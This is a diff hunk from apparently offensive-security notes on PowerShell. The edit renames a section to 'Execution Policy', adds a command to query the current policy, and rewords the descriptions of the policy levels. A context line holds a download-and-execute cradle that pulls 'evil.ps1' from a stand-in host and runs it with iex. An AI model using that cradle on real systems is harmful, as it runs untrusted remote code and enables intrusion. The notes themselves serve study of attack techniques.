@@ -14,15 +14,21 @@ powershell - < ps1file
 iex (new-object net.webclient).downloadstring('http://192.168.0.1/evil.ps1')
 ```
 
-## Security Policy
+## Execution Policy
+
+We can query the execution policy of the current powershell context by running:
+
+```text
+get-executionpolicy
+```
 
 So for security reasons the default policy for executing scripts is **Restricted**. Here are the different script-policies.
 
-**Restricted**: PowerShell won't run any scripts. This is PowerShell's default execution policy.
+**Restricted**: PowerShell won't run any scripts.
 
 **AllSigned**: PowerShell will only run scripts that are signed with a digital signature. If you run a script signed by a publisher PowerShell hasn't seen before, PowerShell will ask whether you trust the script's publisher.
 
 **RemoteSigned**: PowerShell won't run scripts downloaded from the Internet unless they have a digital signature, but scripts not downloaded from the Internet will run without prompting. If a script has a digital signature, PowerShell will prompt you before it runs a script from a publisher it hasn't seen before.
 
-**Unrestricted**: PowerShell ignores digital signatures but will still prompt you before running a script downloaded from the Internet.
+**Unrestricted**: No restrictions on scripts but will still prompt you before running a script downloaded from the Internet.
 
